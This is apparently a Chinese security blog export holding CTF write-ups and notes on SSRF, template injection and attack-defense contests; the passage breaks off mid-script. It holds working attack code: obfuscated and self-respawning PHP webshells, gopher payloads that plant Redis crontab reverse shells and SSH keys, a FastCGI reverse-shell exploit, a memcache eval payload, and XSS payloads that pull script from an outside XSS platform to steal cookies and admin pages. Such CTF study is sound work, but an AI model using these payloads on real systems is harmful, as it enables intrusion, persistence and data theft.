http://www.freebuf.com/sectool/8982.html 网络ID：鬼魅羊羔http://www.freebuf.com/articles/web/96675.html 攻击信息收集主机发现可以用httpscan这个工具 端口扫描用nmap 口令比赛刚开始拼手速，前面提到了一开始需要先讲本机ssh密码和mysql密码改了，同时队友可以试试其他机器的，万一所有机器的口令密码一样就美滋滋了 除了系统层面的口令外，还要考虑下web后台口令 常规漏洞sql注入一般没有防护（对方部署的waf除外），可以用sqlmap跑 上传漏洞也可能只是简单的黑名单或者解析漏洞 文件包含一般可以跨目录读取flag 非常规一句话一些非常规的一句话木马可以防止对方通过你种下的一句话来攻击别的队伍拿到分数 123&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;连接方式：?2=assert密码：1 123456789&lt;?php$a=chr(96^5);$b=chr(57^79);$c=chr(15^110);$d=chr(58^86);$e='($_REQUEST[C])';@assert($a.$b.$c.$d.$e);?&gt;连接方式：?b=))99(rhC(tseuqeR+lave 1234&lt;?php $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;['n985de9'];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt;连接方式：配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs= 连接密码:0 维持权限不死马，访问后会一直生成.config.php的一句话。解决方案：重启apache或者写个脚本一直kill这个进程 1234567891011&lt;?php set_time_limit(0); ignore_user_abort(1); unlink(__FILE__); while(1)&#123; file_put_contents('./.config.php','&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF("",$_cC);@$_();?&gt;'); system('chmod 777 .config.php'); touch("./.config.php",mktime(20,15,1,11,28,2016)); usleep(100); &#125;?&gt; 这个不死马运行后会删除自己，一直生成一个.config.php，和上面的类似 12345678&lt;?php set_time_limit(0); ignore_user_abort(1); unlink(__FILE__); while(1)&#123; file_put_contents('.config.php','&lt;?php @eval($_POST["password"]);?&gt;'); sleep(5); &#125; 不死马的解决方案，先查看进程对应的pid，再执行以下 1234567&lt;?phpwhile (1) &#123; $pid=1234; @unlink('config.php'); exec('kill -9 $pid');&#125;?&gt; 一些小tips当怀疑某个进程是受到攻击后创建的shell进程，可以分析这个进程是否有socket连接 12netstat -antulp #查看连接internet的进程ls /proc/&lt;进程pid&gt;/fd -l | grep socket: | wc -l #查看指定进程socket连接数的命令 类似的可以查看是否有管道连接 1ls /proc/&lt;进程pid&gt;/fd -l | grep pipe: | wc -l 如果有连接，kill掉进程 最后祭上表哥的导图]]></content>
      <tags>
        <tag>小技巧</tag>
        <tag>CTF线下赛</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF补充]]></title>
    <url>%2F2018%2F06%2F26%2FSSRF%E8%A1%A5%E5%85%85%2F</url>
    <content type="text"><![CDATA[前面介绍了ssrf攻击redis、memcach、fastcgi，补充下关于ssrf攻击mysql的 mysql主要是针对mysql未授权访问的情况，即无需密码登陆的情况。因为需要密码登陆时使用的是挑战应答模式，服务器会发送盐给客户端，然后客户端再用盐加密的密码进行登录 本地利用构造数据包先在目标机器上创建一个新用户密码为空 123CREATEUSER &apos; user&apos;@&apos;localhost&apos;;GRANTUSAGE ON *.* TO &apos; user&apos;@&apos;localhost&apos;;GRANTALL ON *.* TO &apos; user&apos;@&apos;localhost&apos;; 然后利用tcpdump进行抓包 需要注意的是，利用上面创建的无密码用户登录时，应该用 1mysql -h 127.0.0.1 -u user -p 而不是 1mysql -u user -p 因为前者用的是TCP/IP套接字，后者用的是unix套接字，这里补充一下unix套接字、内存共享/命名管道、TCP/IP套接字的区别 123unix套接字：mysql客户端和服务器在同一台机器上时使用，mysql -u user -p就是用的unix套接字，它并不是一个网络协议，所以不会抓到它的包，这是一个坑内存共享/命名管道：在windows系统下，客户端和服务器在同一台机器上时使用TCP/IP套接字：mysql -h 127.0.0.1 -u user -p使用的是TCP/IP套接字，本次试验中必修要用TCP/IP套接字，否则不能抓到数据包 tcpdump抓包命令 1tcpdump -i lo port 3306 -w mysql.pcay lo是本地回环的网卡名称，mysql.pcay是保存的文件名 接着开始连接mysql，并且执行一个查询语句，将抓取到的数据包用wireshark打开，筛选mysql数据包 选择Login Request的数据包，并追踪其TCP流 然后过滤出客户端发送给服务器的数据包，并显示和保存数据为原始数据 将这些数据中的换行去掉，并将其url编码，脚本为 123456789101112#coding:utf-8a = '原始数据'b = []l = len(a)for n in range(l): if n % 2 == 0: b.append(a[n:n+2])#print bc = '%'.join(b)print 'curl gopher://127.0.0.1:3306/_%'+ c 脚本输出的结果就是exp 发送数据包利用curl 可以看到查询到了表里的内容，不过由于编码的问题显示不清 我们的目标是拿到shell，并不是简单的查询，并且很多时候并没有回显示，所以拿到shell才是主要的 提权和getshell都与上面的类似，只是把语句修改一下 需要注意的是，现在的mysql服务器默认开启secure-file-priv，只能导出文件到指定目录 远程利用漏洞代码 123456789101112131415161718192021222324252627&lt;?phpif (isset($_GET['url']))&#123; $url = $_GET['url']; $url_parts = parse_url($url); $port = $url_parts['port']; $host = $url_parts['host']; $ip = gethostbynamel($host)[0]; $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); curl_setopt($curl, CURLOPT_MAXREDIRS, 0); curl_setopt($curl, CURLOPT_TIMEOUT, 3); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 3); curl_setopt($curl, CURLOPT_RESOLVE, array($host . ":" . $port . ":" . $ip)); curl_setopt($curl, CURLOPT_PORT, $port); $data = curl_exec($curl); if (curl_error($curl)) &#123; error(curl_error($curl)); &#125; else &#123; echo $data; &#125;&#125;?&gt; 利用方式和前面类似，只是将exp以get形式发送]]></content>
  </entry>
  <entry>
    <title><![CDATA[通过一道xss学习模版注入]]></title>
    <url>%2F2018%2F06%2F22%2F%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93xss%E5%AD%A6%E4%B9%A0%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[之前俊俊在分享会讲模版注入的时候后悔没听啊，这次比赛过程中也因为一个引号的问题错失了好多分，也借这个机会学习一波模版注入 模版注入原理对用户输入过滤不严，将未过滤的数据传给了引擎解析（我瞎编的） 分类模版注入分为客户端和服务器端 客户端模版注入 客户端模版注入主要发生在jQuery和KnockoutJS上 一般只能xss攻击 服务器端模版注入 服务器端模版注入主要发生在Smarty、Mako、Jinja2、Twig等 可以执行任意代码，甚至可以通过文件保护触发 信息收集除了web渗透常规的信息收集外，如果确定系统存在模版注入，需要确认具体的模版引擎，借用不知道是哪个表哥的图，不知道谁是原创就不贴连接了 同一个payload在不同模版引擎中会输出不同的结果，图中的绿色线代表成功输出 利用网上的利用poc很多，就不多说了 新的模版建议看到这个题目名想到了模版注入，进入题目注册登陆，有一个提交筐 提交 1&#123;&#123;1+1&#125;&#125; 可以看到输出了2 因此猜测存在模版注入，进一步验证 1&#123;&#123;&apos;a&apos;.constructor.prototype.charAt=[].join;$eval(&apos;x=1&#125; &#125; &#125;;alert(1)//&apos;);&#125;&#125; 成功弹窗 确定存在模版注入，并且既然可以xss那是不是可以直接打管理员cookie，然后登陆管理员账号拿到flag呢 利用xss平台打一波试试: 1$.getScript(&apos;http://xsspt.com/jhJVns?1529588791&apos;); 最后构造的poc为 1&#123;&#123;&apos;a&apos;.constructor.prototype.charAt=[].join;$eval(&apos;x=1&#125; &#125; &#125;;alert(1);eval(atob(\&apos;JC5nZXRTY3JpcHQoJ2h0dHA6Ly94c3NwdC5jb20vamhKVm5zPzE1Mjk1ODg3OTEnKTs=\&apos;));alert(3);//&apos;);&#125;&#125; 但是发现打到的cookie并不能用于登陆，并且管理员后台在内网 所以只能另辟蹊径 在源码里有一个地址 1http://116.62.137.114:4879/js/min-test.js 访问能拿到另一个路径 1view/admintest2313.html 访问能看到一个后台，但是这个后台什么都不能干，应该只是一个模版 但是在这个后台模版的源码里能找到一个api地址 1$scope.url=&quot;/api/memos/admintest2313&quot; 访问能看到一些备忘录信息 那么猜想如果将后面的admintest2313改为管理员名是不是就能读到管理员的备忘录，就能拿到flag了呢 上面我们拿到了管理员的后台，那通过xss读取后台代码会不会有什么发现呢，借用表哥的js代码： 1234567891011121314151617181920212223$.ajax(&#123; url: "/admin", type: "GET", dataType: "text", success: function(result) &#123; var code = btoa(encodeURIComponent(result)); xssPost('https://xsspt.com/index.php?do=api&amp;id=jhJVns', code); &#125;, error: function(msg) &#123; &#125;&#125;)function xssPost(url, postStr) &#123; var de; de = document.body.appendChild(document.createElement('iframe')); de.src = 'about:blank'; de.height = 1; de.width = 1; de.contentDocument.write('&lt;form method="POST" action="' + url + '"&gt;&lt;input name="code" value="' + postStr + '"/&gt;&lt;/form&gt;'); de.contentDocument.forms[0].submit(); de.style.display = 'none';&#125; ps：id参数需要改为自己xss平台的id参数 提交新的poc即可打到后台的代码： base64和url解码后得到源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;!DOCTYPE html&gt;&lt;html lang="zh-CN"&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt; &lt;!-- 上述3个meta标签*必须*放在最前面，任何其他内容都*必须*跟随其后！ --&gt; &lt;meta name="description" content=""&gt; &lt;meta name="author" content=""&gt; &lt;link rel="icon" href=""&gt; &lt;title&gt;SYC&lt;/title&gt; &lt;link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet"&gt; &lt;link href="css/ie10-viewport-bug-workaround.css" rel="stylesheet"&gt; &lt;link href="css/starter-template.css" rel="stylesheet"&gt; &lt;style type="text/css"&gt; body &#123; padding-top: 60px; padding-bottom: 40px; &#125; &lt;/style&gt; &lt;script src="https://cdn.bootcss.com/angular.js/1.4.6/angular.min.js"&gt;&lt;/script&gt; &lt;script src="https://apps.bdimg.com/libs/angular-route/1.3.13/angular-route.js"&gt;&lt;/script&gt; &lt;script src="js/ie-emulation-modes-warning.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body &gt; &lt;nav class="navbar navbar-inverse navbar-fixed-top"&gt; &lt;div class="container"&gt; &lt;div class="navbar-header"&gt; &lt;button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar"&gt; &lt;span class="sr-only"&gt;Toggle navigation&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class="navbar-brand" href="/"&gt;SYC ADMIN&lt;/a&gt; &lt;/div&gt; &lt;div id="navbar" class="collapse navbar-collapse"&gt; &lt;ul class="nav navbar-nav"&gt; &lt;li class="active"&gt;&lt;a href="#"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;日志&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;账单&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="admin/file"&gt;文件&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="admin/suggest"&gt;留言&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;发布&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/nav&gt;&lt;div class="container"&gt; &lt;div class="jumbotron"&gt; &lt;h1&gt;HELLO adminClound&lt;/h1&gt; &lt;p&gt;新版后台2.0!&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; &lt;!-- Bootstrap core JavaScript================================================== --&gt;&lt;!-- Placed at the end of the document so the pages load faster --&gt;&lt;script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"&gt;&lt;/script&gt;&lt;!-- IE10 viewport hack for Surface/desktop Windows 8 bug --&gt;&lt;script src="js/ie10-viewport-bug-workaround.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 得到管理员账户adminClound以及一个地址admin/file，访问管理员的api地址，得到以下信息 文件密码？先留着吧，后面肯定有用 那接着打admin/file试试，直接在上面的js代码里稍加修改即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;!DOCTYPE html&gt;&lt;html lang="zh-CN"&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt; &lt;!-- 上述3个meta标签*必须*放在最前面，任何其他内容都*必须*跟随其后！ --&gt; &lt;meta name="description" content=""&gt; &lt;meta name="author" content=""&gt; &lt;link rel="icon" href=""&gt; &lt;title&gt;SYC&lt;/title&gt; &lt;link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet"&gt; &lt;link href="css/ie10-viewport-bug-workaround.css" rel="stylesheet"&gt; &lt;link href="css/starter-template.css" rel="stylesheet"&gt; &lt;style type="text/css"&gt; body &#123; padding-top: 60px; padding-bottom: 40px; &#125; &lt;/style&gt; &lt;script src="https://cdn.bootcss.com/angular.js/1.4.6/angular.min.js"&gt;&lt;/script&gt; &lt;script src="https://apps.bdimg.com/libs/angular-route/1.3.13/angular-route.js"&gt;&lt;/script&gt; &lt;script src="js/ie-emulation-modes-warning.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body &gt; &lt;nav class="navbar navbar-inverse navbar-fixed-top"&gt; &lt;div class="container"&gt; &lt;div class="navbar-header"&gt; &lt;button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar"&gt; &lt;span class="sr-only"&gt;Toggle navigation&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class="navbar-brand" href="/"&gt;SYC ADMIN&lt;/a&gt; &lt;/div&gt; &lt;div id="navbar" class="collapse navbar-collapse"&gt; &lt;ul class="nav navbar-nav"&gt; &lt;li class="active"&gt;&lt;a href="#"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;日志&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;账单&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="admin/file"&gt;文件&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="admin/suggest"&gt;留言&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;发布&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/nav&gt;&lt;div class="container"&gt; &lt;form method="post"&gt; &lt;label for="filePasswd" class="sr-only"&gt;输入文件密码&lt;/label&gt; &lt;input type="text" id="filePasswd" class="form-control" placeholder="filepasswd" required="" autofocus="" name="filepasswd"&gt; &lt;button class="btn btn-lg btn-primary btn-block" type="submit"&gt;提交&lt;/button&gt; &lt;/form&gt;&lt;/div&gt;&lt;!-- Bootstrap core JavaScript================================================== --&gt;&lt;!-- Placed at the end of the document so the pages load faster --&gt;&lt;script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"&gt;&lt;/script&gt;&lt;!-- IE10 viewport hack for Surface/desktop Windows 8 bug --&gt;&lt;script src="js/ie10-viewport-bug-workaround.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 显示需要输入文件密码，果然前面拿到的密码有用 一样直接在上面的js上稍加修改，将类型改为post，加入一个data值为前面拿到的密码 最终的poc为 1&#123;&#123;&apos;a&apos;.constructor.prototype.charAt=[].join;$eval(&apos;x=1&#125; &#125; &#125;;alert(1);eval(atob(\&apos;JC5nZXRTY3JpcHQoJ2h0dHA6Ly94c3NwdC5jb20vamhKVm5zPzE1Mjk1OTA3MDUnKTs=\&apos;));alert(3);//&apos;);&#125;&#125; 成功打到flag]]></content>
      <tags>
        <tag>模版注入</tag>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF]]></title>
    <url>%2F2018%2F06%2F14%2FSSRF%2F</url>
    <content type="text"><![CDATA[ssrf的原理就不浪费篇章了，说说ssrf的各种利用及绕过方式 PHP中容易导致ssrf的函数包括file_get_contents、fsockopen、curl_exec 攻击方式除了http/https协议外，还可以使用其他协议来执行操作 本地dict协议攻击redis 1curl -vvv &apos;dict://127.0.0.1:6379/info&apos; 本地file协议读取任意文件 1curl -vvv &apos;file:///etc/passwd&apos; gopher反弹shell 1curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&apos; 攻击应用redis写corntab 先进行连接(telnet也可以进行连接) 1redis-cli -h $ip -p 6379 设置文件夹路径 1config set dir $dir 设置备份文件名 1config set dbfilename $name 设置计划任务 1set $name &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/$ip/$port 0&gt;&amp;1\n\n\n&quot; 保存修改 1save 之后在公网服务器监听端口即刻反弹shell 写ssh key 生成本地公钥并写入文件 12ssh-keygen -t rsa(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; 1.txt 连接并上传公钥文件 1cat 1.txt | redis-cli -h $ip -x set crackkit 建立交互式连接 1redis-cli -h $ip 之后就是设置文件夹（/root/.ssh/），备份文件名以及保存 最后用上传的ssh key进行连接即可 1ssh -i id_rsa root@$ip 写webshell 前提是web目录已知，并且redis用户在web目录有写入权限 设置文件目录 1config set dir $dir 设置备份文件名 1config set dbfilename 1.php 写入一句话并保存 12set $name &quot;&lt;?php @eval($_POST[&apos;1&apos;])；?&gt;&quot;save 不管是哪种方式getshell，都要记得清理痕迹 123DEL $nameCONFIG SET dir /usr/local/redis CONGIG SET dbfilename dump.rdb fastcgi前提：需要知道任意一个PHP文件的绝对路径 exp 123&lt;?phpheader(&quot;Location: gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/127.0.0.1/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00&quot;);?&gt; 请求 1http://127.0.0.1:8899/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=%5Bimg%3D1%2C1%5Dhttp%3A%2f%2f127.0.0.1%3A9999%2f1.php%3Fa.jpg%5B%2fimg%5D 即可在监听的端口上反弹shell memcache首先序列化一句话 1234&lt;?php $code=array('global_start'=&gt;'@eval($_REQUEST[\'eval\']);'); echo serialize($code)."\n".strlen(serialize($code));?&gt; 输出为 12a:1:&#123;s:12:"global_start";s:25:"@eval($_REQUEST['eval']);";&#125; //序列化数据59 //字符串长度 然后建立payload 123&lt;?php header('Location: gopher://[target ip]:11211/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:&#123;s:6:"output";a:1:&#123;s:4:"preg";a:2:&#123;s:6:"search";s:5:"/.*/e";s:7:"replace";s:33:"eval(base64_decode($_POST[ccc]));";&#125;&#125;s:13:"rewritestatus";i:1;&#125;%0d%0a');?&gt; 最后的poc 123&lt;?php header('Location: gopher://192.168.10.12:11211/_%0d%0adelete ssrftest%0d%0a');?&gt; 绕过技巧url格式 需要先了解url格式 12基本URL包含模式（或称协议）、服务器名称（或IP地址）、路径和文件名，如“协议://授权/路径?查询”。完整的、带有授权部分的普通统一资源标志符语法看上去如下：协议://用户名:密码@子域名.域名.顶级域名:端口号/目录/文件名.文件后缀?参数=值#标志 所以可以利用url的这些特性来进行绕过 1234www.baidu.com@127.0.0.1www.baidu.com/127.0.0.1www.baidu.com?127.0.0.1www.baidu.com#127.0.0.1 不过现在的浏览器都会把?和#给转义，”/“符号也会报错，只有@符号还能使用 进制转换 附上python小脚本 12345678910# -*- coding: UTF-8 -*-try: while 1: IP1 = raw_input() print int(''.join(map(lambda x: bin(x)[2:].zfill(8), map(int, IP1.split('.')))), 2) IP2 = input() print '.'.join(map(lambda x: str(int(x, 2)), [bin(IP2)[2:].zfill(32)[i:i + 8] for i in range(0, 32, 8)]))except: pass 本地 本地可以用http://[::]/来进行绕过 还可以利用http://0/来进行绕过，不过这个只有火狐可以解析，谷歌不行 短地址 网上很多端地址服务提供商 利用xip.io和xip.name 原理是dns解析 12http://[*.]127.0.0.1.xip.iohttp://[*.]127.0.0.1.xip.name 利用Enclosed alphanumerics 0 1 2 3 4 5 6 7 8 9 A B C D E F U+246x ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ U+247x ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ U+248x ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ U+249x ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ U+24Ax ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ U+24Bx ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ U+24Cx Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ U+24Dx ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ U+24Ex ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ U+24Fx ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 谷歌可以解析，火狐不能解析 利用句号 1127。0。0。1 同样谷歌可以，火狐不行 tips可以用socat转发端口，即可看到发送的payload，例如 1socat -v tcp-liten:8888,fork tcp-connect:localhost:9999]]></content>
      <tags>
        <tag>web安全</tag>
        <tag>owasp top 10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网安技术大赛部分WP]]></title>
    <url>%2F2018%2F05%2F15%2F%E7%BD%91%E5%AE%89%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BWP%2F</url>
    <content type="text"><![CDATA[太菜了，只做出两道web，后面的两道是参考的史努比小哥哥的 web1进入题目要求登录一下 去注册一个账号，发现了可以修改密码，并且提示flag在flag.php 此时想到能不能重置管理员密码，尝试修改密码然后抓包将用户名改为admin的base64加密，成功重置管理员密码 登录管理员账号 发现可以发布信息，而且那个远程图片地址很扎眼，猜测是ssrf，但是尝试了很久都不对。 又尝试了文件上传，但是上传的文件会被转为jpg，没法解析 后来py了下史努比小哥哥，发现这里有一个坑，确实是ssrf，利用点也在远程图片链接那里。填入 1http://127.0.0.1/flag.php 前缀必须是http://，否则会报错。 发布成功： 将这个图片下载下来，改后缀打开就能拿到flag web2进入题目也是登录页面 但是没找到注册点，弱口令也不行 扫描到了git，看来是git源码泄漏 能看到目录结构 看到了upload.php，看来有文件上传，直接访问是不行的 利用githack工具下载源码 1python githack.py http://117.34.116.192/.git/ 拿到源码分析下upload.php 12345678910111213141516171819202122232425262728293031323334&lt;?php function Administrator($value)&#123; if(empty($_COOKIE[&apos;in_adminid&apos;]) || empty($_COOKIE[&apos;in_adminexpire&apos;]) || $_COOKIE[&apos;in_adminexpire&apos;]!==md5($_COOKIE[&apos;in_adminid&apos;].$_COOKIE[&apos;in_adminname&apos;].$_COOKIE[&apos;in_adminpassword&apos;].$_COOKIE[&apos;in_permission&apos;]))&#123; return False; &#125; setcookie(&quot;in_adminexpire&quot;,$_COOKIE[&apos;in_adminexpire&apos;],time()+1800); if(!empty($_COOKIE[&apos;in_permission&apos;]))&#123; $array=explode(&quot;,&quot;,$_COOKIE[&apos;in_permission&apos;]); $adminlogined=false; for($i=0;$i&lt;count($array);$i++)&#123; if($array[$i]==$value)&#123;$adminlogined=true;&#125; &#125; if(!$adminlogined)&#123; return False; &#125; &#125;else&#123; return False; &#125; return true; &#125; if (Administrator(2))&#123; if(isset($_FILES[&apos;file&apos;]))&#123; $filename = &apos;./img/img&apos;.rand().&apos;.jpg&apos;; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],$filename); header(&apos;Refresh:3,url=index.php?file=upload.php&apos;); echo &quot;Upload $filename Success!&quot;; die; &#125; &#125;else&#123; header(&apos;Refresh:3,url=index.php?file=login.html&apos;); echo &quot;Who are you!&quot;; die; &#125;?&gt; 构造cookie 1in_adminid=2;in_adminname=test;in_adminpassword=test;in_permission=1,2,3,4,5,6,7,8,9;in_adminexpire=b2e9b95b82be9264c3368b3f0de34f08 利用火狐的modify header value插件成功访问upload.php 上传图片后会给出存储地址 然后在file参数那里包含这个图片，再连接Altman即可 里面有一个f14g.php，一开始以为就是flag，可是打开后乱码，改变了很多了编码格式还是乱码，后来搜了下才知道是PM9SCREW加密，利用php_screw解密得到flag WEB 3直接用pc端的浏览器会跳转到QQ空间,想到不久前先知的一篇文章: https://xz.aliyun.com/t/2322 抓包发现了2个请求,首先加载一个JS. 获取到的JS加密了. 1document.write(decodeURIComponent(arcfour(&quot;36a9dc5d29d54b46793d0c682298dbab&quot;,base64_decode(&quot;...&quot;)))) 这里先对密文进行base64解码=&gt;RC4解密=&gt;URL解码,然写入当前页面.只需要简单做下修改就能拿到明文了. 找到其中发送账号密码的请求, 1234567891011if (!err)&#123; $.ajax(&#123; url:'/f701fee85540b78d08cb276d14953d58', type:'POST', dataType:'json', data: "data="+encodeURIComponent(encryptByDES($('#loginform').serialize(),key)), error:function(er)&#123; window.location.href='https://qzone.qq.com'; &#125; &#125;)&#125; 发送的数据会先DES加密,输出明文和密钥看下. 测试后发现密码字段存在注入,用PHP写个中转脚本. 123456789101112131415161718192021222324&lt;?php$ip = $_GET['ip'];$name = $_GET['name'];$pwd = $_GET['pwd'];$p = "ip=&#123;$ip&#125;&amp;hrUW3PG7mp3RLd3dJu=&#123;$name&#125;&amp;LxMzAX2jog9Bpjs07jP=&#123;$pwd&#125;";function des_encrypt($str, $key) &#123; $block = mcrypt_get_block_size('des', 'ecb'); $pad = $block - (strlen($str) % $block); $str .= str_repeat(chr($pad), $pad); return mcrypt_encrypt(MCRYPT_DES, $key, $str, MCRYPT_MODE_ECB);&#125;$c = urlencode(base64_encode(des_encrypt($p,"MiaoMiao")));$post = "data=".$c;//$post = ['data' =&gt; $c,]; 这样写是content-type是上传文件的!!被坑了好久$ch = curl_init();curl_setopt($ch, CURLOPT_URL, "http://45.76.49.10:8001/f701fee85540b78d08cb276d14953d58");curl_setopt($ch, CURLOPT_HTTPHEADER, array('X-Requested-With: XMLHttpRequest',));curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, 